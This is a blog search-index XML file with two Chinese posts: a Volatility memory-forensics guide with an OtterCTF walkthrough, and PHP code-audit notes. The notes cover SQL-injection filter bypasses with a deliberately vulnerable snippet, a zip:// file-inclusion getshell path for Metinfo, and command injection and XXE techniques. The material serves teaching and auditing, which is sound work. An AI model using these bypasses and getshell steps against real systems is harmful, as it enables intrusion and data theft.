<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>volatility取证</title>
      <link href="/2023/04/03/volatility%E5%8F%96%E8%AF%81/"/>
      <url>/2023/04/03/volatility%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>volatility是一款开源的内存取证分析工具，由python编写，支持各种操作系统，能够对导出的windows,linux,mac osx,android等系统内存镜像进行分析。可以通过插件来拓展功能。</p><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><p>命令格式：</p><p>volatility -f [镜像文件] –profile&#x3D;[操作系统] [插件参数]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 文件名 imageinfo        得到镜像的基本信息。</span><br><span class="line">volatility -f 文件名 --profile=系统 pslist查看进程信息</span><br><span class="line">volatility -f 文件名 --profile=系统 pstree    查看进程树</span><br><span class="line">volatility -f 文件名 --profile=系统 hashdump查看用户名密码信息</span><br><span class="line">volatility -f 文件名 --profile=系统 john爆破密码</span><br><span class="line">volatility -f 文件名 --profile=系统 lsadump查看用户强密码</span><br><span class="line">volatility -f 文件名 --profile=系统 svcscan查看服务</span><br><span class="line">volatility -f 文件名 --profile=系统 iehistory查看IE浏览器历史记录</span><br><span class="line">volatility -f 文件名 --profile=系统 netscan查看网络连接</span><br><span class="line">volatility -f 文件名 --profile=系统 cmdscancmd历史命令</span><br><span class="line">volatility -f 文件名 --profile=系统 consoles命令历史记录</span><br><span class="line">volatility -f 文件名 --profile=系统 cmdline查看cmd输出， 获取命令行下运行的程序   </span><br><span class="line">volatility -f 文件名 --profile=系统 envars 查看环境变量，一般很多配合grep筛选，可也是使用-p指定pid</span><br><span class="line">volatility -f 文件名 --profile=系统 filescan查看文件</span><br><span class="line">volatility -f 文件名 --profile=系统 notepad查看当前展示的notepad内容</span><br><span class="line">volatility -f 文件名 --profile=系统 hivelist查看注册表配置单元</span><br><span class="line">volatility -f 文件名 --profile=系统 userassist查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等。</span><br><span class="line">volatility -f 文件名 --profile=系统 clipboard  查看剪贴板的信息</span><br><span class="line">volatility -f 文件名 --profile=系统 timeliner最大程序提取信息</span><br><span class="line">volatility -f 文件名 --profile=系统 Dumpregistry提取日志文件</span><br><span class="line">volatility -f 文件名 --profile=系统 dlllist进程相关的dll文件列表 </span><br><span class="line">volatility -f 文件名 --profile=系统 memdump -p xxx --dump-dir=./ 提取进程</span><br><span class="line">volatility -f 文件名 --profile=系统 dumpfiles -Q 0xxxxxxxx -D ./ 提取文件</span><br><span class="line">volatility -f 文件名 --profile=系统 procdump -p pid -D ./转存可执行程序  </span><br><span class="line">volatility -f 文件名 --profile=系统 screenshot --dump-dir=./屏幕截图</span><br><span class="line">volatility -f 文件名 --profile=系统 hivedump -o 0xfffff8a001032410 查看注册表键名</span><br><span class="line">volatility -f 文件名 --profile=系统 printkey -K &quot;xxxxxxx&quot;查看注册表键值</span><br></pre></td></tr></table></figure><h3 id="OtterCTF取证11题"><a href="#OtterCTF取证11题" class="headerlink" title="OtterCTF取证11题"></a>OtterCTF取证11题</h3><p>在分析之前，都需先查看当前镜像的信息，获取是哪个操作系统，使用imageinfo命令查看</p><p><img src="https://s2.loli.net/2023/04/03/5L7A3QWDfYaqevn.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/5L7A3QWDfYaqevn.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221126101043895"></p><p>然后使用volatility各类工具进行分析即可</p><h4 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h4><p>volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 hashdump查看用户名密码信息</p><p>volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 lsadump查看用户强密码</p><p>使用john爆破密码不出密码尝试lsadump查看用户强密码</p><p>lsadump：从注册表中提取LSA密钥信息,显示加密以后的数据用户密码</p><p><img src="https://s2.loli.net/2023/04/03/snoK4PaIwcEeWhD.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/snoK4PaIwcEeWhD.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667523498876-226543d5-dbe4-46ec-9769-3e84a4b09ac2"></p><h4 id="pc的名称"><a href="#pc的名称" class="headerlink" title="pc的名称"></a>pc的名称</h4><p>查看主机名</p><p>hivelist查看注册表信息，查看到system</p><p>所有用户信息都会存储到注册表，SYSTEM系统信息  </p><p> hivelist查看注册表第一级信息  </p><p>第一级只是目录，路径代表文件名</p><p><img src="https://s2.loli.net/2023/04/03/9RS3NnfecHQzgOG.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/9RS3NnfecHQzgOG.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667273272952-0d1c82e4-69a2-4ab3-a38a-4ea75bd55e1a"></p><p>如果东西不多可以 hivedump  下来查看，如果很多可以用printkey一步步查看</p><p>所以文件的位置使用偏移量来表示，0x开头，使用 printkey打印出来，参数-o，然后根据得到的偏移量，找到系统注册表包含的值  </p><p>volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 printkey -o 0xfffff8a000024010</p><p><img src="https://s2.loli.net/2023/04/03/wCTLSlrqIbunAhe.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/wCTLSlrqIbunAhe.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667273518562-66a4ce31-41ee-44f8-8cd3-87e86c2f2680"></p><p>继续寻找直到找到ComputerName关键词，后面的路径要使用 -K 参数使用一步步来，深入路径</p><p><img src="https://s2.loli.net/2023/04/03/zE9N5pDqSBwkdYP.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/zE9N5pDqSBwkdYP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667280392712-4ed49188-21c7-4826-911d-346098d0c591"></p><p><img src="https://s2.loli.net/2023/04/03/UvTYOVfnz3K1BHF.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/UvTYOVfnz3K1BHF.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667280526336-ca6afdf6-f78a-4c65-b60e-ca55ab008f4a.png"></p><p> 含有目录两层\ComputerName\ComputerName，增加混淆  </p><p><img src="https://s2.loli.net/2023/04/03/NlYUdK9tpm1oV2c.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/NlYUdK9tpm1oV2c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667280573422-877bcd38-d8fa-4b0e-8b45-f8f1a682f57f.png"></p><h4 id="内存正在运行什么游戏，游戏连接哪个服务器"><a href="#内存正在运行什么游戏，游戏连接哪个服务器" class="headerlink" title="内存正在运行什么游戏，游戏连接哪个服务器"></a>内存正在运行什么游戏，游戏连接哪个服务器</h4><p>游戏应该会连接服务器，所以查看网络</p><p>寻找可疑进程，连接外部网络的进程  </p><p>volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 netscan 对所有网络连接进程扫描  </p><p><img src="https://s2.loli.net/2023/04/03/BxNPwgyVbErmi7T.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/BxNPwgyVbErmi7T.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667525270871-0c9ee437-4c88-466a-b7d7-65170a1a08ff"></p><h4 id="账户登录过Lunar-3频道，账户名是什么"><a href="#账户登录过Lunar-3频道，账户名是什么" class="headerlink" title="账户登录过Lunar-3频道，账户名是什么"></a>账户登录过Lunar-3频道，账户名是什么</h4><p>寻找登录游戏频道的游戏账户名。</p><p>需要在游戏进程中查看，用户登录到进程中的话，那么内存应该有登录用户名</p><p>使用strings过滤可打印字符串，grep过滤含有关键字Lunar-3频道字符串</p><p>strings OtterCTF.vmem | grep Lunar-3 -A 5 -B 5</p><p>（-A 查看关键词前几行，-B查看关键词后几行，也可以使用-C查看前后几行）</p><p><img src="https://s2.loli.net/2023/04/03/n6F1x5VjY8UTQvS.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/n6F1x5VjY8UTQvS.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667526232662-a52f533e-77ba-4b5b-8e38-662b6e25eaff"></p><p>都尝试一下发现是0tt3r8r33z3</p><p>strings命令在对象文件或二进制文件中查找可打印的字符串。</p><h4 id="寻找登录名在0x64-0x-6-8-0x40-0x06-0x-18-0x5a-0x0c-0x00-2-后的游戏名"><a href="#寻找登录名在0x64-0x-6-8-0x40-0x06-0x-18-0x5a-0x0c-0x00-2-后的游戏名" class="headerlink" title="寻找登录名在0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} 后的游戏名"></a>寻找登录名在0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} 后的游戏名</h4><p> 意思是用户名总在这个签名之后：0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} </p><p>先将LunarMS.exe进程转存出来；-p pid号</p><p>volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 memdump -p 708 -D .&#x2F; 提取进程</p><p>可以使用010查看 5A 0C 00 片段</p><p>也可以使用：hexdump -C 708.dmp |grep “5a 0c 00” -C 3 </p><p><img src="https://s2.loli.net/2023/04/03/efoLGUlPzJcCr6p.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/efoLGUlPzJcCr6p.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667528845150-7cdcc07d-138d-4412-9dd5-779ed7bb2492"></p><p>寻找5a 0c 00 片段眼都快找花了，太多了</p><p>volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 yarascan -Y “&#x2F;\x64(.{6,8})\x40\x06(.{18})\x5a\x0c\x00\x00&#x2F;i” -p 708</p><p>这个需要安装yarascan插件是最好找的</p><h4 id="寻找经常复制粘贴的账号密码"><a href="#寻找经常复制粘贴的账号密码" class="headerlink" title="寻找经常复制粘贴的账号密码"></a>寻找经常复制粘贴的账号密码</h4><p>volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 clipboard </p><p>clipboard  查看剪贴板的信息</p><p><img src="https://s2.loli.net/2023/04/03/PfrhMez1tHasCyx.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/PfrhMez1tHasCyx.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667529310671-4f588bc2-57e5-42d0-b6c7-0af8a816c529"></p><h4 id="寻找恶意软件名"><a href="#寻找恶意软件名" class="headerlink" title="寻找恶意软件名"></a>寻找恶意软件名</h4><p>一般是使用pslist来查看进程寻找可疑进程名，但也有可能进程名进行了混淆分辨不出来或者被合法进程隐藏了</p><p>使用 pstree 命令可以查看进程树，可以查看所有进程和依赖关系</p><p>pstree代表查看带树结构的进程列表。</p><p>寻找可疑进程：通过寻找PPID大于PID的进程，或查看进程依赖寻找可疑的</p><p><img src="https://s2.loli.net/2023/04/03/lDpLeTGzVSuW972.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/lDpLeTGzVSuW972.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667530498915-276a5036-524a-4a4b-a0a2-c4991386d0a9"></p><p>这里mvware-tray.exe是ppid大于pid的并且很奇怪的是Rick And Morty的子进程  </p><p>dlllist代表查看使用的动态链接库是否合法， 查看一下进程相关的dll文件列表  。-p指定pid号</p><p><img src="https://s2.loli.net/2023/04/03/gPovlrbHye12IGk.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/gPovlrbHye12IGk.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667530794039-159f1a27-3f0e-4de1-98e1-bc82ccd6bdc0"></p><p>发现是在temp目录下进行的，一看就不是正经程序， 因为temp这是一个临时目录  </p><h4 id="恶意软件是如何进入电脑的"><a href="#恶意软件是如何进入电脑的" class="headerlink" title="恶意软件是如何进入电脑的"></a>恶意软件是如何进入电脑的</h4><p>可以查看和恶意软件相关的文件</p><p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 filescan查看文件</p><p>直接查看文件太多，要加过滤，恶意进程的父进程是Rick And Morty</p><p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 filescan | grep ‘Rick And Morty’</p><p><img src="https://s2.loli.net/2023/04/03/zTUkdbQgqiy4Owa.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/zTUkdbQgqiy4Owa.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667531880542-ec706775-a4df-4e7b-ab75-bab3dd48f41a"></p><p>三个种子文件和三个exe文件；寻找来源要关注种子文件，里面可能含有地址信息</p><p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D .&#x2F; 查看文件内容</p><p><img src="https://s2.loli.net/2023/04/03/zWBPLiFRYQGXfZg.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/zWBPLiFRYQGXfZg.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667532538210-3055decc-3c2d-40e2-8b89-3c5c777cfad5"></p><p>在这个文件里发现 website可疑，后面就是flag</p><h4 id="恶意软件种子从哪来"><a href="#恶意软件种子从哪来" class="headerlink" title="恶意软件种子从哪来"></a>恶意软件种子从哪来</h4><p>查看进程可以发现有很多chrome浏览器进程，种子可能是在浏览器中下载的</p><p>先把所有chrome进程转存下来</p><p>memdump -n chrome(指定所有chrome进程) -D .&#x2F;</p><p>再查找 download.exe.torrent</p><p><img src="https://s2.loli.net/2023/04/03/v7HY9ZSmLpVFRMG.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/v7HY9ZSmLpVFRMG.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667541829336-a378f4a5-3716-4f12-8553-059caa9eb908"></p><h4 id="通过恶意软件寻找攻击者的比特币地址"><a href="#通过恶意软件寻找攻击者的比特币地址" class="headerlink" title="通过恶意软件寻找攻击者的比特币地址"></a>通过恶意软件寻找攻击者的比特币地址</h4><p>题目描述说攻击者在恶意勒索软件中留下了比特币地址，是多少呢？  </p><p>首先可以把恶意进程转存到一个可执行文件，使用IDA查看寻找比特币，钱包，支付等关键词，定位地点</p><p>也可以使用dnSpy进行逆向分析  </p><p>也可以把转出的文件使用strings -e l 进行搜索</p><p>strings -e l 3720.dmp | grep -i -A 5 “ransomware”  </p><p><img src="https://s2.loli.net/2023/04/03/XvuDNpwCKGQksdg.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/XvuDNpwCKGQksdg.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667543169806-d4e7c300-7c9c-4938-b368-93aa77aeb87a"></p><h4 id="恶意软件的图像的隐藏信息"><a href="#恶意软件的图像的隐藏信息" class="headerlink" title="恶意软件的图像的隐藏信息"></a>恶意软件的图像的隐藏信息</h4><p>procdump  命令代表转存可执行程序  </p><p><img src="https://s2.loli.net/2023/04/03/qmWAchio6u7U8Ow.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/qmWAchio6u7U8Ow.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1667543459138-765a35fd-a048-4b8d-a9f7-418ea4f612c1"></p><p>使用foremost分离图片</p><p><img src="https://s2.loli.net/2023/04/03/eVlurAiCT8mM4Nt.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/eVlurAiCT8mM4Nt.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230403214045514"></p><p>或者使用反编译查看图片</p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> volatility </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计</title>
      <link href="/2023/04/03/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/04/03/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>官方文档：php.net<br>php官方文档是非常详情，好用的，在遇到不清楚作用的函数时可以进行查询</p><p>白盒测试做代码审计最主要的知识是要去了解一个漏洞应该有哪些防御方式，因为大部分的漏洞都是因为修复没有做的全面，或者修复没有考虑到一些情况导致漏洞。<br>MVC：<br>C：分发处理请求网站的逻辑<br>M：处理和数据库相关的操作<br>V：显示给用户的内容</p><h2 id="代码审计流程"><a href="#代码审计流程" class="headerlink" title="代码审计流程"></a>代码审计流程</h2><h3 id="正向查找流程"><a href="#正向查找流程" class="headerlink" title="正向查找流程"></a>正向查找流程</h3><p>a. 从入口点函数出发（如index.php）<br>b. 找到控制器，理解URL派发规则（URL具体映射到哪个具体的代码里）<br>c. 跟踪控制器调用，以理解代码为目标进行源代码阅读<br>d. 最终在阅读代码的过程和尝试中，可能发现漏洞</p><p>本质：程序员疏忽或逻辑问题导致漏洞 </p><p>特点：</p><ol><li>复杂：需要极其了解目标源码的功能与框架</li><li>跳跃性大：涉及M&#x2F;V&#x2F;C&#x2F;Service&#x2F;Dao等多个层面</li><li>漏洞的组合：通常是多个漏洞的组合，很可能存在逻辑相关的漏洞</li></ol><h3 id="反向查找流程"><a href="#反向查找流程" class="headerlink" title="反向查找流程"></a>反向查找流程</h3><p>a. 通过危险函数，回溯可能存在的漏洞<br>     1. 查找可控变量<br>     2. 传递的过程中触发漏洞</p><p>特点：</p><ol><li>与上下文无关</li><li>危险函数，调用即漏洞</li></ol><p>代码审计工具功能大多就是这个原理</p><h3 id="双向查找流程（手动审计主要方式）"><a href="#双向查找流程（手动审计主要方式）" class="headerlink" title="双向查找流程（手动审计主要方式）"></a>双向查找流程（手动审计主要方式）</h3><ol><li>略读代码，了解框架（正向流程，如：网站都有哪些功能，什么样的架构如mvc：它的m在哪v,c在哪，用了什么模板引擎，是否用了orm（如果使用了ORM那么sql注入就很少了，如果没用是手工写的sql语句，可以关注是否存在sql漏洞）等…)</li><li>是否有全局过滤机制<ol><li>有：是否可以绕过<ol><li>可以：寻找漏洞触发点（反向查找流程，找危险函数）</li><li>不可以：寻找没有过滤的变量</li></ol></li><li>没有：那么就看它具体是如何处理的,具体代码具体分析<ol><li>有处理：寻找遗漏的处理点（如忘记处理的地方或者处理不太正确的地方）</li><li>完全没有处理：可以挖成筛子（很少）</li></ol></li></ol></li></ol><p>3.找到了漏洞点，漏洞利用是否有坑</p><p>根源：理解程序执行过程，找寻危险逻辑<br>特点：<br>    高效：如挖隧道，双向开工，时间减半（不需要去完全理解网站内部原理和函数作用)<br>    知识面广：需要同时掌握正向，反向挖掘技巧，并进行结合<br>    以及所有正向，反向的优点</p><h2 id="SQL注入漏洞挖掘技巧"><a href="#SQL注入漏洞挖掘技巧" class="headerlink" title="SQL注入漏洞挖掘技巧"></a>SQL注入漏洞挖掘技巧</h2><p>PHP+mysql链接方式有：<br>mysql（废弃，但老的仍然有）<br>mysqli<br>PDO</p><h3 id="sql注入常见过滤方法"><a href="#sql注入常见过滤方法" class="headerlink" title="sql注入常见过滤方法"></a>sql注入常见过滤方法</h3><p><strong>intval：</strong>把用户输入的数字后面的所有不是数字的都过滤掉<br><strong>addslashes：</strong>  把 ‘ 前加\转义掉<br><strong>mysql_real_escape：</strong>和第二个类似，但会考虑用户输入和mysql的编码，避免像宽字节注入问题</p><p><strong>mysqli_escape_string</strong> &#x2F; <strong>mysqli_real_escape_string</strong> &#x2F; <strong>mysqli::escape_string</strong>  （和mysqli搭配使用，和前面的功能类似）和他们的差别是会主动加引号包裹</p><p><strong>PDO:</strong>quote</p><p><strong>参数化查询</strong></p><h3 id="常见注入过滤绕过方法"><a href="#常见注入过滤绕过方法" class="headerlink" title="常见注入过滤绕过方法"></a>常见注入过滤绕过方法</h3><p>intval：不知道<br>addslashes  &#x2F;  mysql_real_escape<br>    1.宽字节注入<br>    2.数字型sql语句<br>    3.寻找字符串转换函数（传入编码好的字符绕过过滤，在后面被转换成sql语句）<br>        urldecode<br>        base64_decode<br>        iconv<br>        json_decode<br>        stripshasles<br>        simple_xml_loadstring<br>例如：传入id被过滤但后面有一处代码是解码base64，所以我们可以传入 ‘ 的base64编码绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">....</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>);</span><br><span class="line">....</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from flag where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mysqli::escape_string  &#x2F;&#x2F;  PDO::quote<br>    1.宽字节注入<br>参数化查询<br>    1.寻找非sql值的位置</p><h3 id="开发者容易遗漏得输入点"><a href="#开发者容易遗漏得输入点" class="headerlink" title="开发者容易遗漏得输入点"></a>开发者容易遗漏得输入点</h3><ol><li><p>HTTP头</p><p>a. X-Forwarded-For</p><p>b. User-Agent</p><p>c. Referer</p></li><li><p>PHP_SELF（访问的页面url名，但用户可控）</p></li><li><p>REQUEST_URI（用户请求得完整路径）</p></li><li><p>文件名 $_FILES[][name]</p></li><li><p>php:&#x2F;&#x2F;input   (post穿进去得内容)</p></li></ol><p>引入单引号(转义符)的方法（’号被过滤，看后面有没有可以引入的地方）<br>    stripslashes<br>    base64_decode<br>    urldecode<br>    substr<br>    iconv<br>    str_replace(‘0’,’’,$sql)<br>    xml<br>    json_encode</p><h2 id="任意文件操作"><a href="#任意文件操作" class="headerlink" title="任意文件操作"></a>任意文件操作</h2><p>PHP上传的文件会被保存在$_FILES下</p><p>PHP文件操作函数汇总</p><ol><li>文件包含<ol><li>include &#x2F; require &#x2F; include_once &#x2F; require_once &#x2F; spl_autoload</li></ol></li><li>文件读取<ol><li>file_get_contents &#x2F; fread &#x2F; readfile &#x2F; file &#x2F; highlight_file &#x2F; show_source</li></ol></li><li>文件写入<ol><li>file_put_contents &#x2F; fwrite &#x2F; mkdir &#x2F; fputs</li></ol></li><li>文件删除<ol><li>unlink &#x2F; rmdir</li></ol></li><li>文件上传<ol><li>move_uploaded_file &#x2F; copy &#x2F; rename</li></ol></li></ol><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>文件上传流程：</p><ol><li><p>检查文件大小，后缀，类型</p></li><li><p>检查文件内容（如文件头，尾等）</p></li><li><p>提取文件后缀</p></li><li><p>生成新文件名</p></li><li><p>将上传临时文件拷贝到新文件名位置</p></li></ol><p>文件上传逻辑常见错误</p><ol><li>只检查文件类型不检查文件后缀</li><li>文件后缀黑名单有遗漏</li><li>使用原始文件名，导致\0截断（一般没有了）</li><li>前端检验</li></ol><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>首先明确一点，文件包含漏洞不等于文件读取漏洞</p><p>危害：文件读取  &#x2F;  代码执行<br>常见位置：模板文件名（切换模板）<br>                    语言文件名（切换语言）<br>常见利用：<br>    要寻找可被包含利用的文件：上传文件，临时文件，Session文件，日志文件<br>    后缀无法控制的情况：\0截断，协议利用<br>    PHP5.3.4+ 对包含\0的文件操作函数进行了限制，基本上没有了</p><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>Metinfo 5.3.10版本Getshell漏洞<br>可控制的部分：include $file . ‘.php’;<br>http协议利用：<a href="http://xxxx.com/1.php">http://xxxx.com/1.php</a> (远程文件包含，一般不开设置不能用)<br>PHP协议利用：zip&#x2F;phar<br>    制作2.php的压缩包 -&gt; 2.zip -&gt; 改后缀为 -&gt; 2.jpg<br>    在服务器中上传2.jpg文件<br>    再利用：zip:&#x2F;&#x2F;var&#x2F;www&#x2F;upload&#x2F;head&#x2F;2.jpg#2.php （#意思是访问zip内部的子文件-&gt;2.php）</p><h3 id="文件删除漏洞"><a href="#文件删除漏洞" class="headerlink" title="文件删除漏洞"></a>文件删除漏洞</h3><p>危害：<br>    删除服务器任意文件，DOS服务器<br>    删除安装锁文件，导致目标环境可被重新安装<br>    重新安装  -》任意重置管理员密码</p><h4 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h4><p>上传新头像会把老头像自动删除，但可以把删除老图像的地址换成别的造成任意文件删除</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>命令执行指的是执行系统命令 （ls）<br><a href="https://explainshell.com/%E5%8F%AF%E4%BB%A5%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E5%A4%8D%E6%9D%82%E5%91%BD%E4%BB%A4%E7%9A%84%E6%84%8F%E6%80%9D">https://explainshell.com/可以在这个网站查询复杂命令的意思</a><br>代码执行指的是PHP的代码执行<br>本质：用户输入无过滤，拼接到了系统命令中<br>PHP命令执行函数：</p><ol><li>system</li><li>passthru</li><li>exec</li><li>shell_exec</li><li>popen  (常见的就是上面这5种)</li><li>proc_open</li><li>pcntl_exec</li><li>dl</li></ol><p>要像命令执行很难，要先学会如何正确防御命令注入，才能分辨出哪些没有正确处理</p><p>防御PHP命令注入漏洞：<br>PHP中只能使用escapeshellcmd和escapeshellatg进行命令参数的过滤</p><ol><li>先区分这2个函数：</li></ol><p>​<strong>escapeshellcmd</strong><br>​<strong>escapeshellatg</strong><br>​escapeshellatg没问题但escapeshellatg是只能限制逃逸不出单引号’但有些命令的不常用参数是可以任意命令执行 </p><ol start="2"><li>要把用户的输入放在值里</li></ol><p>​如果把输入直接是键值对可能会造成漏洞</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &#123;$query&#125;</span><br></pre></td></tr></table></figure><p>有一些命令的不常用参数可能会导致一些意外发生。直接使用 | 等命令跳出前面的命令实现命令执行<br>​修复：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -i &#123;$query&#125;</span><br><span class="line">grep -- &#123;$query&#125;</span><br></pre></td></tr></table></figure><h2 id="XML实体注入漏洞"><a href="#XML实体注入漏洞" class="headerlink" title="XML实体注入漏洞"></a>XML实体注入漏洞</h2><p>PHP XML解析函数<br>    simplexml_load_file<br>    simplexml_load_string<br>    SimpleXMLElement<br>    DOMDocument<br>    xml_parse<br>如果发现有这几个函数的地方，基本上可以确定百分之80有xml实体注入 </p><p>libxml_disable_entity_loader(true)来禁用掉外部实体的加载，就不存在xml实体注入</p><p>PHP中XXE漏洞逐渐减少，到现在的版本里几乎已经绝迹了，因为PHP XML操作依赖libxml库<br>但在libxml2.9.0+默认是关闭了xml外部实体解析开关的，可以顺势挖一下也比较简单</p><p>方法：暴力搜索就行，查看有没有xml解析函数，再看禁没禁止外部加载</p><p>无输出点的xxe漏洞：有时候可能存在xxe漏洞但并不会在页面中显示，要利用到blind-xxe<br>Blind XXE原理：<br>    利用XML外部实体功能读取文件<br>    利用XML外部实体功能发送HTTP请求<br>    利用HTTP协议传递文件内容</p><h2 id="前端漏洞"><a href="#前端漏洞" class="headerlink" 